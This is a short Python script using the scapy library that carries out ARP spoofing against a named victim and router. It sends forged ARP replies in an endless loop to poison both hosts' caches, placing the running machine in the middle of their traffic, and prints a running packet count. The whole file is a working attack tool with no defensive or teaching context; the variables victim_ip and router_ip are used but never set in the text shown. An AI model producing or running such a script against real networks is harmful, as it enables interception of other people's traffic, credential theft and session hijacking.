#!/usr/bin/env python
import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broad_req = broadcast/arp_req
    live = scapy.srp(arp_broad_req, timeout=1, verbose=False)[0]
    return live[0][1].hwsrc
def arpsend(target_ip, src_ip):
    target_addr = get_mac(target_ip)
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_addr, psrc=src_ip)
    scapy.send(arp_packet, verbose=False)

packet_count = 0
while True:
    arpsend(victim_ip, router_ip)
    arpsend(router_ip, victim_ip)
    packet_count += 2
    print("\rSpoofing...sent " + str(packet_count) + " packets"),
    sys.stdout.flush()
    time.sleep(2)